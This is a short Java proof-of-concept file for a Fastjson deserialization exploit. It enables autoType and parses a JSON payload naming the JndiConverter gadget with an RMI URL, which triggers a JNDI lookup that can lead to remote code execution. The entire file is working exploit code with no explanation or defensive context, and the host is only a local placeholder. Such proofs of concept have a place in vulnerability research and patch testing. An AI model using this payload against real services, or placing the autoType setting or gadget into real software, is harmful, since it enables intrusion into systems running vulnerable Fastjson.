import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class poc {

    public static void main(String args[]) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String text1 = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1099/tr1ple\"}";
        Object obj = JSON.parseObject(text1);
    }
}